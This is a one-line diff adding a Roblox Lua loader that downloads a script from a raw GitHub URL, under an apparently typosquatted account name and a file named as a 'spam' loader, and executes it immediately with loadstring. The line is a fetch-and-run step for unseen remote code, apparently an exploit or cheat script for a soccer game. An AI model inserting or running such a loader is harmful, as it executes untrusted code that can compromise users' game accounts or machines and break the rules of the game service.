@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/soccer-la-cueva-zua-zua-lpmx-spam3-0jdehtogo2g3rw.lua"))()
